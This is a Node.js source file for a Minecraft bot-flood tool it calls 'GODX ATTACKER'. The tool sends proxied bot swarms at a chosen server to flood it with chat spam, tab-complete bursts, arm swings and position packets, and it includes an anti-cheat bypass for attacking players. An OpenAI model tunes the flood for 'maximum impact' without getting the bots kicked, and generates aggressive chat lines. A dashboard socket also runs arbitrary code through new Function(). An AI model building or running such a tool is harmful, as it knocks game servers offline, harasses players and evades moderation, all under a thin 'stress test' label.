const os = require('os');
const mineflayer = require('mineflayer');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { SocksProxyAgent } = require('socks-proxy-agent');
const path = require('path');
const fs = require('fs');
const { OpenAI } = require("openai");

const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY || process.env.AI_INTEGRATIONS_OPENAI_API_KEY,
  baseURL: process.env.OPENAI_API_KEY ? undefined : process.env.AI_INTEGRATIONS_OPENAI_BASE_URL,
});
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling']
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

let bots = [];
let botConfig = {
    host: 'localhost',
    port: 25565,
    version: false,
    count: 0,
    proxies: [],
    mode: 'stay',
    intensity: 5,
    joinDelay: 500,
    username: 'GODX'
};

let packetCount = 0;
let systemLatency = 0;
let totalJoins = 0; // Track total joining

// Calculate system latency (event loop delay)
setInterval(() => {
    const start = Date.now();
    setTimeout(() => {
        systemLatency = Date.now() - start;
    }, 0);
}, 1000);

setInterval(() => {
    lastPktSec = packetCount;
    
    // Calculate server performance metrics
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const memUsage = ((usedMem / totalMem) * 100).toFixed(1);
    const cpuLoad = os.loadavg()[0].toFixed(2);

    io.emit('traffic-data', {
        packets: packetCount,
        bots: bots.length,
        latency: systemLatency,
        totalJoins: totalJoins,
        timestamp: Date.now(),
        performance: {
            cpu: cpuLoad,
            memory: memUsage,
            uptime: Math.floor(process.uptime())
        }
    });
    packetCount = 0;
}, 1000);

let isPaused = false;
let aiActive = false;
let targetServerHealth = 100;
let lastPktSec = 0;

let aiCircuitBroken = false;
let aiCooldownTimer = null;

async function runAiOptimization() {
    if (!aiActive || bots.length === 0 || aiCircuitBroken) return;

    try {
        const prompt = `Current Status:
        - Active Bots: ${bots.length}/${botConfig.count}
        - Packets/Sec: ${lastPktSec}
        - Join Delay: ${botConfig.joinDelay}ms
        - Mode: ${botConfig.mode}
        
        Analyze the server stability. If Packets/Sec is dropping while bots are constant, the server might be throttling. 
        Adjust the 'joinDelay' and 'intensity' for maximum impact without getting the bots mass-kicked.
        Return ONLY a JSON object with: {"joinDelay": number, "intensity": number, "reason": "string"}`;

        const response = await openai.chat.completions.create({
            model: "gpt-4o-mini",
            messages: [{ role: "user", content: prompt }],
            response_format: { type: "json_object" }
        }).catch(e => {
            if (e.status === 429) {
                aiCircuitBroken = true;
                if (aiCooldownTimer) clearTimeout(aiCooldownTimer);
                aiCooldownTimer = setTimeout(() => { aiCircuitBroken = false; }, 600000); // 10m cooldown
            }
            return null;
        });

        if (!response) return;
        const optimization = JSON.parse(response.choices[0].message.content);
        botConfig.joinDelay = optimization.joinDelay;
        botConfig.intensity = optimization.intensity;
        io.emit('ai-log', { msg: `AI optimization applied: ${optimization.reason}`, settings: optimization });
    } catch (e) {
        // console.error('AI Optimization failed', e);
    }
}

setInterval(runAiOptimization, 30000);

io.on('connection', (socket) => {
    socket.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });

    let stealthMode = false;
    let scripts = {};

    socket.on('start-test', (data) => {
        isPaused = false;
        botConfig = {
            ...botConfig,
            ...data,
            intensity: parseInt(data.intensity) || 5
        };
        aiActive = !!data.aiActive;
        stealthMode = !!data.stealthMode;
        startBots(parseInt(data.count) || 0);
    });

    socket.on('save-script', (data) => {
        scripts[data.name] = data.content;
        socket.emit('script-saved', { name: data.name });
    });

    socket.on('run-script', (data) => {
        bots.forEach(bot => {
            try {
                const scriptFunc = new Function('bot', data.content);
                scriptFunc(bot);
            } catch (e) {
                console.error('Script execution failed', e);
            }
        });
    });

    socket.on('update-config', (data) => {
        botConfig = {
            ...botConfig,
            ...data,
            intensity: parseInt(data.intensity) || botConfig.intensity
        };
        io.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });
    });

    socket.on('toggle-ai', (data) => {
        aiActive = data.enabled;
        io.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });
    });

    socket.on('broadcast-chat', (msg) => {
        bots.forEach(bot => {
            try { bot.chat(msg); } catch(e) {}
        });
    });

    socket.on('stop-test', () => {
        isPaused = false;
        stopBots();
    });

    socket.on('load-proxy-file', (type) => {
        try {
            const filePath = path.join(__dirname, 'data', 'proxies', `${type}.txt`);
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8');
                const proxyList = content.split('\n')
                    .map(line => line.trim())
                    .filter(line => line.length > 0)
                    .map(line => {
                        // Ensure we prepend the correct protocol if missing
                        if (!line.includes('://')) {
                            return `${type}://${line}`;
                        }
                        return line;
                    });
                
                botConfig.proxies = proxyList;
                socket.emit('proxy-loaded', { count: proxyList.length, type, list: proxyList });
                io.emit('status', { count: bots.length, config: botConfig, isPaused, aiActive });
            }
        } catch (e) {
            console.error('Failed to load proxy file', e);
        }
    });

    socket.on('pause-test', () => {
        isPaused = true;
        io.emit('pause-status', { isPaused: true });
    });

    socket.on('resume-test', () => {
        isPaused = false;
        io.emit('pause-status', { isPaused: false });
    });
});

function createSingleBot(i, total) {
    if (bots.length >= total) return;
    
    const baseUsername = botConfig.username || 'CRYSTAL';
    const randomSuffix = Math.floor(Math.random() * 90000 + 10000);
    const botUsername = `${baseUsername}_${i}_${randomSuffix}`.substring(0, 16);
    
    const currentProxyList = botConfig.proxies && botConfig.proxies.length > 0 ? botConfig.proxies : [];
    
    const botOptions = {
        host: botConfig.host,
        port: parseInt(botConfig.port),
        username: botUsername,
        version: botConfig.version && botConfig.version !== 'auto' ? botConfig.version : false,
        hideErrors: true, 
        checkTimeoutInterval: 120000, 
        connectTimeout: 120000, 
        auth: 'offline',
        onMoping: true,
        skipValidation: true,
        colorsEnabled: false,
        chatLengthLimit: 64,
        brand: 'vanilla',
        maxListeners: 5,
        viewDistance: 'tiny',
        physicsEnabled: false, 
        plugins: {
            conversions: false,
            furnace: false,
            placeBlock: false,
            villager: false,
            bed: false,
            book: false,
            anvil: false,
            enchantment_table: false,
            chest: false,
            dispenser: false,
            tablist: false,
            bossbar: false,
            scoreboard: false,
            particle: false,
            sound: false,
            inventory: false,
            window: false,
            kick: false,
            physics: false,
            entities: false,
            time: false,
            health: true, 
            experience: false,
            rain: false,
            ray_trace: false,
            tab_complete: false
        }
    };

    if (currentProxyList.length > 0) {
        const proxy = currentProxyList[i % currentProxyList.length];
        try {
            let proxyUrl = proxy.includes('://') ? proxy : `socks5://${proxy}`;
            if (proxyUrl.startsWith('socks4')) {
                proxyUrl = proxyUrl.replace('socks4://', 'socks4a://');
            }
            botOptions.agent = new SocksProxyAgent(proxyUrl);
        } catch (e) {}
    }

    try {
        const bot = mineflayer.createBot(botOptions);

        // Track initialized listeners to avoid memory leaks
        const cleanup = () => {
            if (bot._hasCleanedUp) return;
            bot._hasCleanedUp = true;
            
            bot.removeAllListeners();
            if (bot._client) {
                bot._client.removeAllListeners();
                bot._client.end();
            }
            
            const index = bots.indexOf(bot);
            if (index > -1) bots.splice(index, 1);
            
            io.emit('bot-status', { username: bot.username, status: 'disconnected' });
            io.emit('status', { count: bots.length, config: botConfig });
        };

        // Fix: Use a safer login handler that checks for bot state
        bot.on('health', () => {
            io.emit('bot-health-update', {
                username: bot.username,
                health: bot.health,
                status: isPaused ? 'active' : 'attacking'
            });
            // Immediately sync status for faster dashboard updates
            io.emit('status', { count: bots.length, config: botConfig });
        });

        bot.once('login', () => {
            if (!bots.includes(bot)) {
                bots.push(bot);
                totalJoins++;
                io.emit('bot-status', { username: bot.username, status: 'joined' });
                io.emit('bot-health-update', {
                    username: bot.username,
                    health: 20,
                    status: 'active'
                });
            }
            // Faster status sync on join
            io.emit('status', { count: bots.length, config: botConfig });
            setupBotBehavior(bot);
        });

        bot.on('error', (err) => {
            // console.error(`[${bot.username}] Bot error: ${err.message}`);
            if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT') {
                // Silently handle common network errors to prevent crash
                cleanup();
                return;
            }
            if (isRunning() && !isPaused) {
                setTimeout(() => createSingleBot(bots.length, botConfig.count), 5000);
            }
            cleanup();
        });

        bot.on('close', cleanup);
        bot.once('end', () => {
            if (isRunning() && !isPaused) {
                setTimeout(() => createSingleBot(bots.length, botConfig.count), 5000);
            }
            cleanup();
        });
        bot.once('kicked', (reason) => {
            if (isRunning() && !isPaused) {
                setTimeout(() => createSingleBot(bots.length, botConfig.count), 10000);
            }
            cleanup();
        });

    } catch (err) {
        // console.error('Bot creation failed', err);
    }
}

function isRunning() {
    return activeTimeouts.length > 0 || bots.length > 0;
}

function setupBotBehavior(bot) {
    const originalChat = bot.chat;
    bot.chat = function(msg) {
        if (isPaused) return;
        packetCount++;
        
        if (stealthMode) {
            const jitter = Math.random() * 2000;
            setTimeout(() => {
                try {
                    return originalChat.apply(this, [msg]);
                } catch (e) {}
            }, jitter);
            return;
        }

        try {
            return originalChat.apply(this, arguments);
        } catch (e) {
            console.error('Chat failed', e);
        }
    };

    if (bot._client) {
        bot._client.on('error', (err) => {
            // console.error('Client protocol error', err.message);
        });

        const originalWrite = bot._client.write;
        bot._client.write = function(name, params) {
            if (isPaused && name !== 'keep_alive' && name !== 'teleport_confirm') return;
            
            packetCount++;
            return originalWrite.apply(this, arguments);
        };

        bot._client.on('packet', (data, metadata) => {
            if (isPaused) return;
            // Maximum-load optimization: Ignore ALL non-essential packets
            if (bots.length > 30) {
                const essentialPackets = ['keep_alive', 'disconnect', 'chat', 'position', 'update_health'];
                if (!essentialPackets.includes(metadata.name)) return;
            }
        });
    }

    const intervals = [];

    if (botConfig.mode === 'ai-chat') {
        const interval = setInterval(async () => {
            if (isPaused) return;
            if (!bot.entity) return;
            try {
                // Circuit breaker for individual bots
                if (aiCircuitBroken) {
                    const fallbacks = ["Security testing active.", "Analyzing network protocol.", "GODX protocol stress."];
                    bot.chat(fallbacks[Math.floor(Math.random() * fallbacks.length)]);
                    return;
                }

                const prompt = `You are a professional security testing bot named ${bot.username}. 
                Generate a short, aggressive, and highly realistic message to send to a Minecraft server chat. 
                Keep it under 80 characters. No emojis.`;

                const response = await openai.chat.completions.create({
                    model: "gpt-4o-mini",
                    messages: [{ role: "user", content: prompt }],
                    max_tokens: 30
                }).catch(e => {
                    if (e.status === 429) {
                        aiCircuitBroken = true;
                        if (aiCooldownTimer) clearTimeout(aiCooldownTimer);
                        aiCooldownTimer = setTimeout(() => { aiCircuitBroken = false; }, 600000);
                    }
                    return null;
                });

                if (!response) {
                    // Local fallback to reduce API pressure and handle rate limits
                    const fallbacks = [
                        "Protocol analysis in progress...",
                        `Stress testing module ${Math.random().toString(36).substring(7)}`,
                        "Analyzing server response latency.",
                        "GODX ATTACKER security audit active.",
                        `Packet burst sequence ${Date.now().toString().slice(-4)}`
                    ];
                    bot.chat(fallbacks[Math.floor(Math.random() * fallbacks.length)]);
                    return;
                }
                const msg = response.choices[0].message.content.trim();
                bot.chat(msg);
            } catch (e) {
                bot.chat(`[CRYSTAL-AI] Protocol Stress ${Math.random().toString(36).substring(7)}`);
            }
        }, Math.max(15000, 30000 - (botConfig.intensity * 2000))); // Increased interval to prevent rate limits
        intervals.push(interval);
    } else if (botConfig.mode === 'ai-move' || botConfig.mode === 'ai-human') {
        const interval = setInterval(async () => {
            if (isPaused || !bot.entity) return;
            try {
                // AI Movement Throttling & Circuit Breaker
                if (aiCircuitBroken || Math.random() > 0.05) { // Only 5% of bots use AI movement now
                    bot._client.write('position', {
                        x: bot.entity.position.x + (Math.random() - 0.5) * 2,
                        y: bot.entity.position.y,
                        z: bot.entity.position.z + (Math.random() - 0.5) * 2,
                        onGround: true
                    });
                    return;
                }

                const otherBots = bots.filter(b => b.username !== bot.username).map(b => b.username).slice(0, 5);
                const nearbyBlocks = bot.findBlocks({
                    matching: (block) => block.name !== 'air',
                    maxDistance: 4,
                    count: 5
                });
                const nearbyEntities = Object.values(bot.entities).filter(e => e !== bot.entity && e.position.distanceTo(bot.entity.position) < 15);

                const prompt = `You are a professional Minecraft player named ${bot.username}. 
                Current Position: ${Math.round(bot.entity.position.x)}, ${Math.round(bot.entity.position.y)}, ${Math.round(bot.entity.position.z)}.
                Teammates nearby: ${otherBots.join(', ') || 'none'}.
                Surroundings: ${nearbyBlocks.length > 0 ? nearbyBlocks.map(p => bot.blockAt(p).name).join(', ') : 'open area'}.
                Nearby entities: ${nearbyEntities.length} entities.
                
                Choose a natural action: ["jump", "sprint", "swing", "look_at_friend", "chat_social", "crouch", "wander", "look_at_entity", "mine", "punch_entity"].
                "mine" - if there are blocks nearby.
                "punch_entity" - if entities are very close.
                "chat_social" - talk about the game, mining, or friends.
                Return ONLY JSON: {"action": "string", "chat": "string" or null}`;

                const response = await openai.chat.completions.create({
                    model: "gpt-4o-mini",
                    messages: [{ role: "user", content: prompt }],
                    response_format: { type: "json_object" },
                    max_tokens: 150
                }).catch((err) => {
                    console.warn(`[${bot.username}] AI API Error:`, err.message);
                    return null;
                });

                if (!response) {
                    bot.setControlState('forward', true);
                    setTimeout(() => bot.setControlState('forward', false), 1000);
                    return;
                }
                
                let result;
                try {
                    result = JSON.parse(response.choices[0].message.content);
                } catch (parseError) {
                    console.warn(`[${bot.username}] AI Parse Error:`, parseError.message);
                    return;
                }

                const action = result.action;

                if (action === 'jump') { 
                    bot.setControlState('jump', true); 
                    setTimeout(() => bot.setControlState('jump', false), 500); 
                }
                else if (action === 'sprint' || action === 'wander') { 
                    bot.setControlState('forward', true); 
                    bot.setControlState('sprint', true); 
                    // Move more frequently and for longer to feel like a normal player
                    setTimeout(() => { 
                        bot.setControlState('forward', false); 
                        bot.setControlState('sprint', false); 
                    }, 1500 + Math.random() * 2500); 
                    
                    if (action === 'wander') {
                        const yaw = bot.entity.yaw + (Math.random() - 0.5) * Math.PI;
                        bot.look(yaw, 0, false);
                    }
                }
                else if (action === 'crouch') { 
                    bot.setControlState('sneak', true); 
                    setTimeout(() => bot.setControlState('sneak', false), 1000); 
                }
                else if (action === 'look_at_entity' && nearbyEntities.length > 0) {
                    bot.lookAt(nearbyEntities[0].position.offset(0, nearbyEntities[0].height || 1, 0));
                }
                else if (action === 'look_at_friend' && otherBots.length > 0) {
                    const friend = bot.nearestEntity(e => e.type === 'player' && otherBots.includes(e.username));
                    if (friend) bot.lookAt(friend.position.offset(0, friend.height, 0));
                }
                else if (action === 'mine' && nearbyBlocks.length > 0) {
                    const target = bot.blockAt(nearbyBlocks[0]);
                    if (bot.canDigBlock(target)) {
                        bot.lookAt(target.position);
                        bot.dig(target).catch(() => {});
                    }
                }
            try {
                // Advanced Anti-Cheat Bypass: Randomized Attack Patterns
                const nearbyEntities = Object.values(bot.entities)
                    .filter(e => e.type === 'player' && e.id !== bot.entity.id && bot.entity.position.distanceTo(e.position) < 4.5);
                
                if (nearbyEntities.length > 0) {
                    const target = nearbyEntities[0];
                    
                    // 1. Randomized Hit Timing (Combat Jitter)
                    const jitter = Math.random() * 150;
                    setTimeout(() => {
                        // 2. Head Rotation Before Attack (Legit Look)
                        bot.lookAt(target.position.offset(0, target.height, 0), true);
                        
                        // 3. Critical Hit Simulation (Jump then hit)
                        if (Math.random() > 0.7 && bot.entity.onGround) {
                            bot.setControlState('jump', true);
                            setTimeout(() => bot.setControlState('jump', false), 100);
                        }
                        
                        // 4. Attack
                        bot.attack(target);
                        
                        // 5. Post-Attack Movement (Circle Strafe)
                        const angle = Math.random() * Math.PI * 2;
                        bot.entity.position.x += Math.cos(angle) * 0.2;
                        bot.entity.position.z += Math.sin(angle) * 0.2;
                        
                    }, jitter);
                }
            } catch (e) {}

                if (result.chat) bot.chat(result.chat);
                
            } catch (e) {
                // console.error(`[${bot.username}] AI Logic Error:`, e.message);
            }
        }, 5000 + Math.random() * 3000); 
        intervals.push(interval);
    } else if (botConfig.mode === 'move') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return;
            // Manual movement packets instead of physics engine
            bot._client.write('position', {
                x: bot.entity.position.x + (Math.random() - 0.5),
                y: bot.entity.position.y,
                z: bot.entity.position.z + (Math.random() - 0.5),
                onGround: true
            });
        }, 1000);
        intervals.push(interval);
    } else if (botConfig.mode === 'spam') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return;
            // High frequency chat spam
            bot.chat(`[CRYSTAL-XDR] ${Math.random().toString(36).substring(2, 10)} ${Date.now().toString().slice(-4)}`);
            bot.chat(`[STORM] ${Math.random().toString(36).substring(2, 12)}`);
        }, Math.max(20, 100 - (botConfig.intensity * 8)));
        intervals.push(interval);
    } else if (botConfig.mode === 'tab-spam') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity || !bot._client) return clearInterval(interval);
            try {
                // Triple packet burst for tab-spam
                for(let i=0; i<3; i++) {
                    bot._client.write('tab_complete', {
                        text: '/',
                        assume_command: false,
                        look_at_block: null
                    });
                }
            } catch (e) {}
        }, Math.max(10, 500 - (botConfig.intensity * 45)));
        intervals.push(interval);
    } else if (botConfig.mode === 'arm-spam') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return clearInterval(interval);
            bot.swingArm('right');
            bot.swingArm('left');
            // Packet flood via look desync
            bot.look(bot.entity.yaw + 0.1, bot.entity.pitch, true);
        }, Math.max(10, 150 - (botConfig.intensity * 14)));
        intervals.push(interval);
    } else if (botConfig.mode === 'position-flood') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return clearInterval(interval);
            // High frequency movement packets
            for(let i=0; i<5; i++) {
                bot.entity.position.x += (Math.random() - 0.5) * 0.1;
                bot.entity.position.z += (Math.random() - 0.5) * 0.1;
            }
        }, Math.max(10, 250 - (botConfig.intensity * 24)));
        intervals.push(interval);
    } else if (botConfig.mode === 'block-interact') {
        const interval = setInterval(() => {
            if (isPaused) return;
            if (!bot.entity) return;
            try {
                bot.swingArm('right');
                const block = bot.blockAt(bot.entity.position.offset(0, -1, 0));
                if (block) bot.activateBlock(block);
            } catch (e) {
                // Silently handle interaction errors to prevent bot crashes
            }
        }, Math.max(200, 2000 - (botConfig.intensity * 180)));
        intervals.push(interval);
    }

    bot.on('end', () => {
        intervals.forEach(clearInterval);
    });
}

let activeTimeouts = [];

function startBots(count) {
    stopBots();
    // Optimized for speed: Faster batching and reduced delays
    const BATCH_SIZE = 5; 
    
    for (let i = 0; i < count; i++) {
        const batchNum = Math.floor(i / BATCH_SIZE);
        const batchStagger = batchNum * 2000; // 2s between batches (down from 4s)
        const intraBatchDelay = (i % BATCH_SIZE) * 300; // 0.3s within batch (down from 1.2s)
        
        const rawDelay = batchStagger + intraBatchDelay + (Math.random() * 200);
        const jitteredDelay = Math.floor(Math.min(rawDelay, 2147483647));
        
        const timeout = setTimeout(() => {
            if (bots.length >= count) return;
            createSingleBot(bots.length, count);
        }, jitteredDelay);
        activeTimeouts.push(timeout);
    }
}

function stopBots() {
    activeTimeouts.forEach(clearTimeout);
    activeTimeouts = [];
    
    // Create a copy of the array to iterate over
    const botsToStop = [...bots];
    bots = []; // Immediately clear global array
    
    botsToStop.forEach(bot => {
        try { 
            // Explicitly remove all listeners before ending
            bot.removeAllListeners();
            if (bot._client) {
                bot._client.removeAllListeners();
                bot._client.end();
                bot._client.destroy();
                bot._client = null;
            }
            if (bot.entity) bot.entity = null;
            if (bot.entities) bot.entities = {};
            bot.end();
            bot = null;
        } catch(e) {}
    });
    
    if (global.gc) {
        try { global.gc(); } catch (e) {}
    }
    
    io.emit('status', { count: 0, config: botConfig });
}

process.on('uncaughtException', (err) => {
    // console.error('CRITICAL: Uncaught Exception', err);
});

process.on('unhandledRejection', (reason, promise) => {
    // console.error('CRITICAL: Unhandled Rejection', reason);
});

// Explicitly listen on all interfaces and the port provided by the environment
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`GODX ATTACKER Professional Tool running on port ${PORT}`);
});

// Ensure a fast health check endpoint exists for Autoscale
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});
